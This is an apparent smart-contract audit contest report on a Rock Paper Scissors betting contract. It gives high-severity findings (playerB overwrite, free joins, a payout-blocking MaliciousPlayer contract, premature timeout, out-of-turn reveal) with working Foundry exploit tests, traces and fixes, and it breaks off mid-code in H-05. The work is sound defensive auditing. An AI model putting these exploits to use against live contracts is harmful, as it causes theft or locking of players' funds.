# Rock Paper Scissors - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. PlayerB Address Can Be Overwritten in joinGameWithEth and joinGameWithToken Functions](#H-01)
    - [H-02. Players can join games for free](#H-02)
    - [H-03.  [H-1] Denial of Service via ETH Transfer Revert](#H-03)
    - [H-04. [M-2] Invalid TimeoutReveal When Only One Commit Exists](#H-04)
    - [H-05. RevealMove before Another Player CommitMove Makes Hacker Win All the Multi-Turns Games](#H-05)
- ## Medium Risk Findings
    - [M-01. Funds received thru receive() are locked🔒](#M-01)
    - [M-02. If a player has won the majority of turns, the losing player can prevent the winning player from receiving rewards](#M-02)
    - [M-03. Lack of Player Address Binding in Move Commitments Allows Replay and Cheating in RockPaperScissors Contract](#M-03)
- ## Low Risk Findings
    - [L-01. WinningToken Accumulation in the RockPaperScissors Due to Incorrect transferFrom Usage](#L-01)
    - [L-02. [H-01] ETH Rounding Error in RockPaperScissors::_handleTie()](#L-02)
    - [L-03. we can cancel the game even before the revealDeadline](#L-03)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #38

### Dates: Apr 17th, 2025 - Apr 24th, 2025

[See more contest details here](https://codehawks.cyfrin.io/c/2025-04-rock-paper-scissors)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 5
   - Medium: 3
   - Low: 3


# High Risk Findings

## <a id='H-01'></a>H-01. PlayerB Address Can Be Overwritten in joinGameWithEth and joinGameWithToken Functions

_Submitted by [bowtiedbrothers](https://profiles.cyfrin.io/u/bowtiedbrothers), [w33ked](https://profiles.cyfrin.io/u/w33ked), [nuuopdaem](https://profiles.cyfrin.io/u/nuuopdaem), [gaurangbrdv](https://profiles.cyfrin.io/u/gaurangbrdv), [freesultan](https://profiles.cyfrin.io/u/freesultan), [0x40](https://profiles.cyfrin.io/u/0x40), [sauron22](https://profiles.cyfrin.io/u/sauron22), [0xch1d3r4n](https://profiles.cyfrin.io/u/0xch1d3r4n), [37h3rn17y2](https://profiles.cyfrin.io/u/37h3rn17y2), [lucky2892000](https://profiles.cyfrin.io/u/lucky2892000), [rajpatil](https://profiles.cyfrin.io/u/rajpatil), [vito](https://profiles.cyfrin.io/u/vito), [hyperion](https://profiles.cyfrin.io/u/hyperion), [marutint10](https://profiles.cyfrin.io/u/marutint10), [eagerpanda582](https://profiles.cyfrin.io/u/eagerpanda582), [0xsrhacker](https://profiles.cyfrin.io/u/0xsrhacker), [aliyugombe](https://profiles.cyfrin.io/u/aliyugombe), [azriel20005](https://profiles.cyfrin.io/u/azriel20005), [swarecito](https://profiles.cyfrin.io/u/swarecito), [edoscoba](https://profiles.cyfrin.io/u/edoscoba), [feranmiola](https://profiles.cyfrin.io/u/feranmiola), [0xbyteknight](https://profiles.cyfrin.io/u/0xbyteknight), [zacwilliamson](https://profiles.cyfrin.io/u/zacwilliamson), [0xblackadam](https://profiles.cyfrin.io/u/0xblackadam), [vladich0x](https://profiles.cyfrin.io/u/vladich0x), [blazebloom](https://profiles.cyfrin.io/u/blazebloom), [nhippolyt](https://profiles.cyfrin.io/u/nhippolyt), [etijie](https://profiles.cyfrin.io/u/etijie), [manaxtech](https://profiles.cyfrin.io/u/manaxtech), [poink](https://profiles.cyfrin.io/u/poink), [jfornells](https://profiles.cyfrin.io/u/jfornells), [rayno_44](https://profiles.cyfrin.io/u/rayno_44), [milnail](https://profiles.cyfrin.io/u/milnail), [favourokerri](https://profiles.cyfrin.io/u/favourokerri), [roccomania](https://profiles.cyfrin.io/u/roccomania), [vtim99077](https://profiles.cyfrin.io/u/vtim99077), [Invcbull Audit Group](https://codehawks.cyfrin.io/team/cm9v6m6w50001jr046qraih72), [mishoko](https://profiles.cyfrin.io/u/mishoko), [cyfe45](https://profiles.cyfrin.io/u/cyfe45), [wwzzmming](https://profiles.cyfrin.io/u/wwzzmming). Selected submission by: [vito](https://profiles.cyfrin.io/u/vito)._      
            


## Summary

The `RockPaperScissors` game contract contains a critical security vulnerability in both the `joinGameWithEth()` and `joinGameWithToken()` functions. Neither function validates whether `game.playerB` has already been set, allowing multiple players to join the same game and overwrite the previous playerB value. This results in the original joining player losing their staked ETH or tokens without any possibility of playing the game or recovering their funds.

## Vulnerability Details

Both functions for joining games only check that the game is in the "Created" state, but fail to validate whether another player has already joined the game as `playerB`. When a player joins a game, they commit their stake (either ETH or tokens), but if another player calls the same function afterward, they will overwrite the playerB address value without any validation.
The original playerB loses access to the game and their stake remains locked in the contract with no mechanism to recover it, while the latest player to call the function becomes the new playerB.

Proof of Concept:

```solidity
    function testJoinGameWithTokenOverridesOriginalPlayerB() public {
        // First create address for bob (attacker) and fund bob 
        address bob = makeAddr("bob");
        vm.prank(address(game));
        token.mint(bob, 10);

        vm.startPrank(playerA);
        token.approve(address(game), 1);
        gameId = game.createGameWithToken(TOTAL_TURNS, TIMEOUT);
        vm.stopPrank();
        vm.startPrank(playerB);
        token.approve(address(game), 1);
        game.joinGameWithToken(gameId);
        vm.stopPrank();

        // Now bob joins the game with token overriding playerB
        vm.startPrank(bob);
        token.approve(address(game), 1);
        game.joinGameWithToken(gameId);
        vm.stopPrank();

        // Verify bob's attack on playerB succeeded
        (, address storedPlayerB,,,,,,,,,,,,,, ) =
            game.games(gameId);
        assertEq(storedPlayerB, bob);
    }

    function testJoinGameWithEthOverridesOriginalPlayerB() public {
        // First create address for bob and fund bob 
        address bob = makeAddr("bob");
        vm.deal(bob, 10 ether);

        uint amount = 1 ether;
        vm.startPrank(playerA);
        token.approve(address(game), 1);
        gameId = game.createGameWithEth{value: amount}(TOTAL_TURNS, TIMEOUT);
        vm.stopPrank();
        vm.startPrank(playerB);
        game.joinGameWithEth{value:amount}(gameId);
        vm.stopPrank();

        // Now bob joins the game with token overriding playerB
        vm.startPrank(bob);
        game.joinGameWithEth{value: amount}(gameId);
        vm.stopPrank();

        // Verify bob's attack on playerB succeeded
        (, address storedPlayerB,,,,,,,,,,,,,, ) =
            game.games(gameId);
        assertEq(storedPlayerB, bob);
    }
```

## Impact

The impact of this vulnerability is High due to loss of funds and ease of execution:

* Any player who joins a game can have their position locked forever by another player.
* This vulnerability can be exploited repeatedly on the same game, causing multiple players to lose their stakes.
* This fundamentally breaks the game and creates a significant financial risk for any participant.
* The vulnerability can be weaponized by malicious users to undermine the whole system to become not viable anymore.

## Tools Used

* Foundry

## Recommendations

* Add a validation check in both functions to ensure playerB has not already been set.

## <a id='H-02'></a>H-02. Players can join games for free

_Submitted by [w33ked](https://profiles.cyfrin.io/u/w33ked), [asteriknight](https://profiles.cyfrin.io/u/asteriknight), [5am](https://profiles.cyfrin.io/u/5am), [r00tth3w0r1d](https://profiles.cyfrin.io/u/r00tth3w0r1d), [harisuthan5534798](https://profiles.cyfrin.io/u/harisuthan5534798), [0x_martonyx](https://profiles.cyfrin.io/u/0x_martonyx), [0xch1d3r4n](https://profiles.cyfrin.io/u/0xch1d3r4n), [pokeraaaccceee](https://profiles.cyfrin.io/u/pokeraaaccceee), [37h3rn17y2](https://profiles.cyfrin.io/u/37h3rn17y2), [anchabadze](https://profiles.cyfrin.io/u/anchabadze), [vito](https://profiles.cyfrin.io/u/vito), [thecarrot](https://profiles.cyfrin.io/u/thecarrot), [0x4nud33p](https://profiles.cyfrin.io/u/0x4nud33p), [sharkeateateat](https://profiles.cyfrin.io/u/sharkeateateat), [0xdef4](https://profiles.cyfrin.io/u/0xdef4), [al88nsk](https://profiles.cyfrin.io/u/al88nsk), [vincent71399](https://profiles.cyfrin.io/u/vincent71399), [feranmiola](https://profiles.cyfrin.io/u/feranmiola), [surajgjadhav](https://profiles.cyfrin.io/u/surajgjadhav), [freesultan](https://profiles.cyfrin.io/u/freesultan), [vladich0x](https://profiles.cyfrin.io/u/vladich0x), [accessdenied](https://profiles.cyfrin.io/u/accessdenied), [poink](https://profiles.cyfrin.io/u/poink), [staykovd](https://profiles.cyfrin.io/u/staykovd), [vtim99077](https://profiles.cyfrin.io/u/vtim99077), [arkaudits](https://profiles.cyfrin.io/u/arkaudits), [cyfe45](https://profiles.cyfrin.io/u/cyfe45). Selected submission by: [5am](https://profiles.cyfrin.io/u/5am)._      
            


## Summary

When a game is created using `RockPaperScissors::createGameWithToken()`, players can call `RockPaperScissors::joinGameWithEth()` with no value to join the game for free.

## Vulnerability Details

When a user calls `RockPaperScissors::createGameWithToken()`, it sets `game.bet = 0`.

```solidity
function createGameWithToken(uint256 _totalTurns, uint256 _timeoutInterval) external returns (uint256) {
        require(winningToken.balanceOf(msg.sender) >= 1, "Must have winning token");
        require(_totalTurns > 0, "Must have at least one turn");
        require(_totalTurns % 2 == 1, "Total turns must be odd");
        require(_timeoutInterval >= 5 minutes, "Timeout must be at least 5 minutes");

        // Transfer token to contract
        winningToken.transferFrom(msg.sender, address(this), 1);

        uint256 gameId = gameCounter++;

        Game storage game = games[gameId];
        game.playerA = msg.sender;
@>      game.bet = 0; // Zero ether bet because using token
        game.timeoutInterval = _timeoutInterval;
        game.creationTime = block.timestamp;
        game.joinDeadline = block.timestamp + joinTimeout;
        game.totalTurns = _totalTurns;
        game.currentTurn = 1;
        game.state = GameState.Created;

        emit GameCreated(gameId, msg.sender, 0, _totalTurns);

        return gameId;
    }
```

This means that another user can call `RockPaperScissors::joinGameWithEth()` with `{value: 0}` and join the game for free.

Add the following code to the test suite:

```solidity
function testPlayerBCanJoinTokenGameForFree() public {
        // playerA creates a game with token.
        vm.startPrank(playerA);
        token.approve(address(game), 1);
        gameId = game.createGameWithToken(TOTAL_TURNS, TIMEOUT);
        vm.stopPrank();

        vm.startPrank(playerB);
        console2.log("playerB token balance before joining: ", token.balanceOf(playerB));
        console2.log("playerB ETH balance before joining: ", playerB.balance);
        // This line confirms playerB joined the game.
        vm.expectEmit();
        emit PlayerJoined(gameId, address(playerB));
        // playerB joins game by calling joinGameWithEth with no value.
        game.joinGameWithEth{value: 0}(gameId);
        // playerB's balance has not changed.
        console2.log("playerB token balance after joining: ", token.balanceOf(playerB));
        console2.log("playerB ETH balance before joining: ", playerB.balance);
    }
```

The output is:

```bash
Ran 1 test for test/RockPaperScissorsTest.t.sol:RockPaperScissorsTest
[PASS] testPlayerBCanJoinTokenGameForFree() (gas: 244672)
Logs:
  playerB token balance before joining:  10
  playerB ETH balance before joining:  10000000000000000000
  playerB token balance after joining:  10
  playerB ETH balance before joining:  10000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.40ms (1.86ms CPU time)
```

## Impact

Anyone can join games created with `RockPaperScissors::createGameWithToken` for free and play with zero risk, effectively gaming the protocol.

## Tools Used

Manual review

## Recommendations

Require `game.bet > 0` when calling `RockPaperScissors::joinGameWithEth`.

```diff
function joinGameWithEth(uint256 _gameId) external payable {
        Game storage game = games[_gameId];

        require(game.state == GameState.Created, "Game not open to join");
        require(game.playerA != msg.sender, "Cannot join your own game");
        require(block.timestamp <= game.joinDeadline, "Join deadline passed");
+       require(game.bet > 0, "Bet amount cannot be zero");
        require(msg.value == game.bet, "Bet amount must match creator's bet");

        game.playerB = msg.sender;
        emit PlayerJoined(_gameId, msg.sender);
    }
```

## <a id='H-03'></a>H-03.  [H-1] Denial of Service via ETH Transfer Revert

_Submitted by [proofofexploit](https://profiles.cyfrin.io/u/proofofexploit), [a39955720](https://profiles.cyfrin.io/u/a39955720), [37h3rn17y2](https://profiles.cyfrin.io/u/37h3rn17y2), [vito](https://profiles.cyfrin.io/u/vito), [0xdef4](https://profiles.cyfrin.io/u/0xdef4), [hyperion](https://profiles.cyfrin.io/u/hyperion), [xyizko](https://profiles.cyfrin.io/u/xyizko), [grands9n47](https://profiles.cyfrin.io/u/grands9n47), [edoscoba](https://profiles.cyfrin.io/u/edoscoba), [blackgrease](https://profiles.cyfrin.io/u/blackgrease), [narendravarma070](https://profiles.cyfrin.io/u/narendravarma070), [staykovd](https://profiles.cyfrin.io/u/staykovd), [jfornells](https://profiles.cyfrin.io/u/jfornells), [rayno_44](https://profiles.cyfrin.io/u/rayno_44), [mentemdeus](https://profiles.cyfrin.io/u/mentemdeus), [arkaudits](https://profiles.cyfrin.io/u/arkaudits). Selected submission by: [proofofexploit](https://profiles.cyfrin.io/u/proofofexploit)._      
            


## Description:

The contract `RockPaperScissors.sol` attempts to transfer ETH to the winner of a game using a low-level call. If the \_winner is a contract that reverts on receiving ETH (e.g., using a receive() function that reverts), the transaction fails and the logic reverts entirely:

```javascript

(bool success,) = _winner.call{value: prize}("");
require(success, "Transfer failed");

```

This allows a malicious player to win a game and then block its resolution entirely by refusing the payout, causing the game to be stuck in a pending state indefinitely. This constitutes a Denial of Service (DoS) vector

**So**

If the \_winner is an attacking contract, its receive() can do this:

```javascript

receive() external payable {
    revert("I don't want your ETH");
}

```

This results in:

* call{value:} fails

* success == false

* require(success, ...) rolls back all execution

* The game is not marked as over

* Funds are stuck

* No one can advance

## Impact:

* The game cannot be marked as finished.

* No prize can be withdrawn.

* Funds remain locked in the contract.

* The DoS is fully reproducible and prevents normal game flow.

* Admin has no override mechanism.

* Critical game logic is tightly coupled with external code execution

## Proof of Concept:

* A test contract called RPS\_DoS.t.sol has been created for the proof of concept.

* To run the test, simply execute:

```javascript
forge test --mt test_DoSOnWinnerPayout -vvvv
```

```javascript

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/RockPaperScissors.sol"; 

/// @notice Attacking contract reverts upon receiving ETH
contract MaliciousPlayer {
    receive() external payable {
        revert("I refuse your ETH");
    }

    function getCommit() external pure returns (uint8 move, bytes32 salt, bytes32 commitment) {
        move = 1; // Rock
        salt = keccak256("malicious");
        commitment = keccak256(abi.encodePacked(move, salt));
    }
}

contract RockPaperScissorsDoSTest is Test {
    RockPaperScissors public game;
    WinningToken public token;
    MaliciousPlayer public attacker;
    address public honest = address(0xA1);

    function setUp() public {
        game = new RockPaperScissors();
        token = game.winningToken();
        attacker = new MaliciousPlayer();

        // Allocate funds to both players
        vm.deal(honest, 1 ether);
        vm.deal(address(attacker), 1 ether);
    }

    function test_DoSOnWinnerPayout() public {
        // Step 1: Honest player creates a game
        vm.prank(honest);
        uint256 gameId = game.createGameWithEth{value: 0.5 ether}(1, 10 minutes);

        // Step 2: The attacker generates his commit
        (,, bytes32 attackerCommit) = attacker.getCommit();

        // Step 3: The attacker joins the game
        vm.prank(address(attacker));
        game.joinGameWithEth{value: 0.5 ether}(gameId);

        // Step 4: Both commit
        vm.prank(honest);
        bytes32 saltHonest = keccak256("scissors");
        bytes32 commitHonest = keccak256(abi.encodePacked(uint8(3), saltHonest)); // Scissors
        game.commitMove(gameId, commitHonest);

        vm.prank(address(attacker));
        game.commitMove(gameId, attackerCommit);

        // Step 5: Both reveal
        vm.prank(honest);
        game.revealMove(gameId, 3, saltHonest); // Scissors

        // Attacker reveals and wins → an attempt is made to pay him → his contract is reverted → Transfer failed
        vm.expectRevert("Transfer failed");
        vm.prank(address(attacker));
        game.revealMove(gameId, 1, keccak256("malicious")); // Rock
    }
}

```

## Output (-vvvv):

```javascript

❯ forge test --mt test_DoSOnWinnerPayout -vvvv
Warning: This is a nightly build of Foundry. It is recommended to use the latest stable version. Visit https://book.getfoundry.sh/announcements for more information. 
To mute this warning set `FOUNDRY_DISABLE_NIGHTLY_WARNING` in your environment. 

[⠒] Compiling...
[⠆] Compiling 1 files with Solc 0.8.20
[⠰] Solc 0.8.20 finished in 14.69s
Compiler run successful!

Ran 1 test for test/RPS_DoS.t.sol:RockPaperScissorsDoSTest
[PASS] test_DoSOnWinnerPayout() (gas: 381969)
Traces:
  [381969] RockPaperScissorsDoSTest::test_DoSOnWinnerPayout()
    ├─ [0] VM::prank(0x00000000000000000000000000000000000000A1)
    │   └─ ← [Return]
    ├─ [184325] RockPaperScissors::createGameWithEth{value: 500000000000000000}(1, 600)
    │   ├─ emit GameCreated(gameId: 0, creator: 0x00000000000000000000000000000000000000A1, bet: 500000000000000000 [5e17], totalTurns: 1)
    │   └─ ← [Return] 0
    ├─ [350] MaliciousPlayer::getCommit() [staticcall]
    │   └─ ← [Return] 1, 0x613994f4e324d0667c07857cd5d147994bc917da5d07ee63fc3f0a1fe8a18e34, 0x95d5a991cd6eef57626c991cc2d997728db28b2f9a1e8cd2277828e4ab2a4d6a
    ├─ [0] VM::prank(MaliciousPlayer: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
    │   └─ ← [Return]
    ├─ [24919] RockPaperScissors::joinGameWithEth{value: 500000000000000000}(0)
    │   ├─ emit PlayerJoined(gameId: 0, player: MaliciousPlayer: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x00000000000000000000000000000000000000A1)
    │   └─ ← [Return]
    ├─ [47751] RockPaperScissors::commitMove(0, 0x5b2259b4e9b249588f0bf27d95d4bcc7030acc8a614c59d27d57007032701852)
    │   ├─ emit MoveCommitted(gameId: 0, player: 0x00000000000000000000000000000000000000A1, currentTurn: 1)
    │   └─ ← [Return]
    ├─ [0] VM::prank(MaliciousPlayer: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
    │   └─ ← [Return]
    ├─ [46119] RockPaperScissors::commitMove(0, 0x95d5a991cd6eef57626c991cc2d997728db28b2f9a1e8cd2277828e4ab2a4d6a)
    │   ├─ emit MoveCommitted(gameId: 0, player: MaliciousPlayer: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], currentTurn: 1)
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x00000000000000000000000000000000000000A1)
    │   └─ ← [Return]
    ├─ [4375] RockPaperScissors::revealMove(0, 3, 0x389a2d4e358d901bfdf22245f32b4b0a401cc16a4b92155a2ee5da98273dad9a)
    │   ├─ emit MoveRevealed(gameId: 0, player: 0x00000000000000000000000000000000000000A1, move: 3, currentTurn: 1)
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xf28dceb3:  Transfer failed)
    │   └─ ← [Return]
    ├─ [0] VM::prank(MaliciousPlayer: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
    │   └─ ← [Return]
    ├─ [39158] RockPaperScissors::revealMove(0, 1, 0x613994f4e324d0667c07857cd5d147994bc917da5d07ee63fc3f0a1fe8a18e34)
    │   ├─ emit MoveRevealed(gameId: 0, player: MaliciousPlayer: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], move: 1, currentTurn: 1)
    │   ├─ emit TurnCompleted(gameId: 0, winner: MaliciousPlayer: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], currentTurn: 1)
    │   ├─ emit FeeCollected(gameId: 0, feeAmount: 100000000000000000 [1e17])
    │   ├─ [160] MaliciousPlayer::receive{value: 900000000000000000}()
    │   │   └─ ← [Revert] revert: I refuse your ETH
    │   └─ ← [Revert] revert: Transfer failed
    └─ ← [Return]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.09ms (218.16µs CPU time)

Ran 1 test suite in 593.43ms (1.09ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

```

**Recommended Mitigation:**

Use the pull-payment pattern to avoid transferring ETH during game logic execution:

```javascript

mapping(address => uint256) public pendingWithdrawals;

// Instead of sending ETH directly:
pendingWithdrawals[_winner] += prize;

function withdraw() external {
    uint256 amount = pendingWithdrawals[msg.sender];
    require(amount > 0, "Nothing to withdraw");
    pendingWithdrawals[msg.sender] = 0;
    (bool success,) = msg.sender.call{value: amount}("");
    require(success, "Withdraw failed");
}

```

This ensures that even if a player refuses to accept ETH, the game logic proceeds normally and funds can still be withdrawn manually.

## Classification:

* Severity: High

* Type: Denial of Service (SWC-113)

* Reproducibility: Confirmed with Forge test

* Mitigation: Available and well-documented

Conclusion: This issue poses a real risk to the integrity and availability of the RockPaperScissors protocol and should be addressed immediately.

## <a id='H-04'></a>H-04. [M-2] Invalid TimeoutReveal When Only One Commit Exists

_Submitted by [proofofexploit](https://profiles.cyfrin.io/u/proofofexploit), [37h3rn17y2](https://profiles.cyfrin.io/u/37h3rn17y2), [a39955720](https://profiles.cyfrin.io/u/a39955720), [edoscoba](https://profiles.cyfrin.io/u/edoscoba), [appswahidconnected](https://profiles.cyfrin.io/u/appswahidconnected), [azriel20005](https://profiles.cyfrin.io/u/azriel20005), [teheelaa](https://profiles.cyfrin.io/u/teheelaa), [nonanondores](https://profiles.cyfrin.io/u/nonanondores), [xgrybto](https://profiles.cyfrin.io/u/xgrybto), [dappscout](https://profiles.cyfrin.io/u/dappscout). Selected submission by: [proofofexploit](https://profiles.cyfrin.io/u/proofofexploit)._      
            


### Description

The timeoutReveal() function is intended to allow a game to be canceled when a player fails to reveal their move during the reveal phase. However, the contract allows calling timeoutReveal() even when only one player has committed, which violates the intended flow of the commit-reveal mechanism.

This is a logic vulnerability: the reveal phase should not be active unless both players have committed moves.

### Impact

* A player can prematurely cancel the game and reclaim funds.
* May be used to abuse matchmaking (exit games at will after inspecting the opponent).
* Leads to unexpected game resolution without actual reveal.

### Proof of Concept

```solidity
function test_StuckInCommitPhase() public {
    address playerA = address(0xA1);
    address playerB = address(0xB2);

    RockPaperScissors game = new RockPaperScissors();
    vm.deal(playerA, 1 ether);
    vm.deal(playerB, 1 ether);

    vm.prank(playerA);
    uint256 gameId = game.createGameWithEth{value: 0.5 ether}(1, 600);

    vm.prank(playerB);
    game.joinGameWithEth{value: 0.5 ether}(gameId);

    bytes32 saltA = keccak256("123salt");
    bytes32 commitA = keccak256(abi.encodePacked(uint8(1), saltA));
    vm.prank(playerA);
    game.commitMove(gameId, commitA);

    // Player B never commits
    vm.warp(block.timestamp + 7 days);

    vm.expectRevert("Cannot timeout yet");
    vm.prank(playerA);
    game.timeoutReveal(gameId); // Unexpectedly succeeds
}
```

### Test output complete:

The trace shows the game was cancelled and both players were refunded, despite only one player committing

```solidity
 forge  test --mt test_StuckInCommitPhase -vvvv
Warning: This is a nightly build of Foundry. It is recommended to use the latest stable version. Visit https://book.getfoundry.sh/announcements for more information. 
To mute this warning set `FOUNDRY_DISABLE_NIGHTLY_WARNING` in your environment. 

[⠢] Compiling...
[⠑] Compiling 1 files with Solc 0.8.20
[⠘] Solc 0.8.20 finished in 16.04s
Compiler run successful!

Ran 1 test for test/RPS_DoSCommitPhase.t.sol:RPS_DoSCommitPhase
[FAIL: next call did not revert as expected] test_StuckInCommitPhase() (gas: 306076)
Traces:
  [2750597] RPS_DoSCommitPhase::setUp()
    ├─ [2701883] → new RockPaperScissors@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   ├─ [599683] → new WinningToken@0x104fBc016F4bb334D775a19E8A6510109AC63E00
    │   │   ├─ emit OwnershipTransferred(previousOwner: 0x0000000000000000000000000000000000000000, newOwner: RockPaperScissors: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   └─ ← [Return] 2541 bytes of code
    │   └─ ← [Return] 10115 bytes of code
    ├─ [0] VM::deal(0x00000000000000000000000000000000000000A1, 1000000000000000000 [1e18])
    │   └─ ← [Return]
    ├─ [0] VM::deal(0x00000000000000000000000000000000000000b2, 1000000000000000000 [1e18])
    │   └─ ← [Return]
    └─ ← [Return]

  [306076] RPS_DoSCommitPhase::test_StuckInCommitPhase()
    ├─ [0] VM::prank(0x00000000000000000000000000000000000000A1)
    │   └─ ← [Return]
    ├─ [184325] RockPaperScissors::createGameWithEth{value: 500000000000000000}(1, 600)
    │   ├─ emit GameCreated(gameId: 0, creator: 0x00000000000000000000000000000000000000A1, bet: 500000000000000000 [5e17], totalTurns: 1)
    │   └─ ← [Return] 0
    ├─ [0] VM::prank(0x00000000000000000000000000000000000000b2)
    │   └─ ← [Return]
    ├─ [24919] RockPaperScissors::joinGameWithEth{value: 500000000000000000}(0)
    │   ├─ emit PlayerJoined(gameId: 0, player: 0x00000000000000000000000000000000000000b2)
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x00000000000000000000000000000000000000A1)
    │   └─ ← [Return]
    ├─ [47751] RockPaperScissors::commitMove(0, 0xa9d4ce77dff0de977314d3315109465f2a102f840a47b3adc7d7f7e6ae0697c2)
    │   ├─ emit MoveCommitted(gameId: 0, player: 0x00000000000000000000000000000000000000A1, currentTurn: 1)
    │   └─ ← [Return]
    ├─ [0] VM::warp(604801 [6.048e5])
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xf28dceb3:  Cannot timeout yet)
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x00000000000000000000000000000000000000A1)
    │   └─ ← [Return]
    ├─ [19203] RockPaperScissors::timeoutReveal(0)
    │   ├─ [0] 0x00000000000000000000000000000000000000A1::fallback{value: 500000000000000000}()
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x00000000000000000000000000000000000000b2::fallback{value: 500000000000000000}()
    │   │   └─ ← [Stop]
    │   ├─ emit GameCancelled(gameId: 0)
    │   └─ ← [Return]
    └─ ← [Revert] next call did not revert as expected

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 775.31µs (151.96µs CPU time)

Ran 1 test suite in 697.98ms (775.31µs CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/RPS_DoSCommitPhase.t.sol:RPS_DoSCommitPhase
[FAIL: next call did not revert as expected] test_StuckInCommitPhase() (gas: 306076)

Encountered a total of 1 failing tests, 0 tests succeeded
```

### Test Out

```solidity
├─ emit GameCancelled(gameId: 0)
├─ 0x...A1::fallback{value: 0.5 ETH}()
├─ 0x...B2::fallback{value: 0.5 ETH}()
```

This confirmed the issue: timeoutReveal() succeeded even though revealDeadline was never initialized. The test failed because it expected a revert (Cannot timeout yet), but the call completed successfully.

This reveals a flawed logical condition that misfires the cancel path.

### Recommended Mitigation:

Add a check to timeoutReveal() to ensure both players have committed before enforcing the timeout logic:

```solidity
require(game.commitA != bytes32(0) && game.commitB != bytes32(0), "Reveal phase not active");
require(block.timestamp >= game.revealDeadline, "Cannot timeout yet");
```

## <a id='H-05'></a>H-05. RevealMove before Another Player CommitMove Makes Hacker Win All the Multi-Turns Games

_Submitted by [linxun](https://profiles.cyfrin.io/u/linxun), [whistleh1995](https://profiles.cyfrin.io/u/whistleh1995), [pokeraaaccceee](https://profiles.cyfrin.io/u/pokeraaaccceee), [0x_martonyx](https://profiles.cyfrin.io/u/0x_martonyx), [0x4nud33p](https://profiles.cyfrin.io/u/0x4nud33p), [blurad](https://profiles.cyfrin.io/u/blurad), [xyizko](https://profiles.cyfrin.io/u/xyizko), [vladich0x](https://profiles.cyfrin.io/u/vladich0x), [jfornells](https://profiles.cyfrin.io/u/jfornells), [roccomania](https://profiles.cyfrin.io/u/roccomania), [vtim99077](https://profiles.cyfrin.io/u/vtim99077), [howiecht](https://profiles.cyfrin.io/u/howiecht). Selected submission by: [whistleh1995](https://profiles.cyfrin.io/u/whistleh1995)._      
            


## Summary

A critical vulnerability exists in the Rock Paper Scissors game contract where a malicious player can manipulate the game flow to prevent the other player from committing their move. By revealing their move and immediately committing and revealing the next turn's move, the attacker can force the game into a state where the victim cannot commit their move, allowing the attacker to win through timeout.

## Vulnerability Details

The vulnerability stems from the game's turn management mechanism. In the Rock Paper Scissors game, players take turns committing and revealing their moves. However, there's a flaw in the implementation that allows a player to manipulate the turn sequence:

1. Player A creates a game and Player B joins
2. Both players commit their moves for the first turn
3. Player A reveals their move
4. Player B reveals their move for the first turn
5. **Critical vulnerability**: Player B can immediately commit and reveal their move for the second turn
6. This prevents Player A from committing their move for the second turn
7. Player B can then wait for the timeout and win the game

Overall, hacker can use this vulnerability to win the all games which has one more turns.

## Impact

This vulnerability has severe consequences:

1. **Game Manipulation**: A malicious player can always win the game by exploiting this vulnerability
2. **Funds Loss**: The victim loses their entire bet amount
3. **Broken Game Mechanics**: The core gameplay mechanics are completely broken
4. **No Fair Play**: The game becomes unplayable as one player can always force a win

The POC demonstrates that Player B can win the game by forcing Player A to timeout, resulting in Player B receiving the entire prize pool minus fees.

## POC

PoC in Foundry as follows:

```solidity
contract RockPaperScissorsTest is Test {
    // Contracts
    RockPaperScissors public game;
    WinningToken public token;

    // Test accounts
    address public admin;
    address public playerA;
    address public playerB;

    // Test constants
    uint256 constant BET_AMOUNT = 0.1 ether;
    uint256 constant TIMEOUT = 10 minutes;
    uint256 constant TOTAL_TURNS = 3; // Must be odd

    // Game ID for tests
    uint256 public gameId;

    // Setup before each test
    function setUp() public {
        // Set up addresses
        admin = address(this);
        playerA = makeAddr("playerA");
        playerB = makeAddr("playerB");

        // Fund the players
        vm.deal(playerA, 10 ether);
        vm.deal(playerB, 10 ether);

        // Deploy contracts
        game = new RockPaperScissors();
        token = WinningToken(game.winningToken());

        // Mint some tokens for players for token tests
        vm.prank(address(game));
        token.mint(playerA, 10);

        vm.prank(address(game));
        token.mint(playerB, 10);
    }

    function test_RevealStopCommit() public {
        // console the balance of playerA and playerB
        console.log("playerA balance : ", playerA.balance);
        console.log("playerB balance : ", playerB.balance);

        // playerA creates a game
        vm.startPrank(playerA);
        gameId = game.createGameWithEth{value: BET_AMOUNT}(TOTAL_TURNS, TIMEOUT);
        vm.stopPrank();

        // playerB joins the game, commits move
        vm.startPrank(playerB);
        game.joinGameWithEth{value: BET_AMOUNT}(gameId);
        vm.stopPrank();

        // playe the first turn, no matter who wins
        uint8 moveA = uint8(RockPaperScissors.Move.Rock);
        bytes32 saltA = keccak256(abi.encodePacked("salt for player A", gameId, moveA));
        bytes32 commitA = keccak256(abi.encodePacked(moveA, saltA));
        vm.prank(playerA);
        game.commitMove(gameId, commitA);

        uint8 moveB = uint8(RockPaperScissors.Move.Scissors);
        bytes32 saltB = keccak256(abi.encodePacked("salt for player B", gameId, moveB));
